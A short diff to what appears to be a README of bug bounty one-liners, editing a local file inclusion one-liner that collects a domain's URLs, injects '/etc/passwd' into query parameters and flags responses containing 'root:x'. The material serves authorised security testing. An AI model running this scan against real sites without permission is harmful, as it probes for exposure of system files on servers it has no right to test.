@@ -9,7 +9,7 @@ This repository stores and houses various one-liner for bug bounty tips provided
 > @dwisiswant0
 
 ```bash
-gau $1 | gf lfi | qsreplace "/etc/passwd" | xargs -I % -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
 ```
 
 ### Open-redirect
